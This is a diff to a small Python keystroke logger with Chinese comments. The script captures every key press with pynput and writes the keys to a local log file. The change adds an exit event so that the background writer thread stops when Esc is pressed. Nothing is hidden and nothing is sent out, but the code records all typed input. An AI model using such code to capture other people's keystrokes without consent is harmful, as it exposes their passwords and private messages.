@@ -2,18 +2,19 @@ import logging
 from pynput import keyboard
 import threading
 import time
-from datetime import datetime
 
 # 设置日志文件和格式
 logging.basicConfig(filename="keyboard_log.txt", level=logging.INFO, format='%(asctime)s: %(message)s')
 
 # 用于缓存按键记录
 key_buffer = []
+exit_event = threading.Event()
 
 # 按键记录函数
 def on_press(key):
     # 记录特殊退出按键，如Esc
     if key == keyboard.Key.esc:
+        exit_event.set()
         # 停止监听
         return False
     try:
@@ -25,7 +26,7 @@ def on_press(key):
 
 # 将缓存的数据写入文件并清空缓存
 def write_to_file():
-    while True:
+    while not exit_event.is_set():
         if key_buffer:
             logging.info(' '.join(key_buffer))
             key_buffer.clear()
@@ -40,13 +41,13 @@ def start_listener():
 
 def main():
     # 创建并启动定时保存的线程
-    thread = threading.Thread(target=write_to_file, daemon=True)
-    thread.start()
+    write_thread = threading.Thread(target=write_to_file, daemon=True)
+    write_thread.start()
 
     # 开始监听键盘
     start_listener()
 
-    thread.join()
+    write_thread.join()
 
 if __name__ == '__main__':
     main()
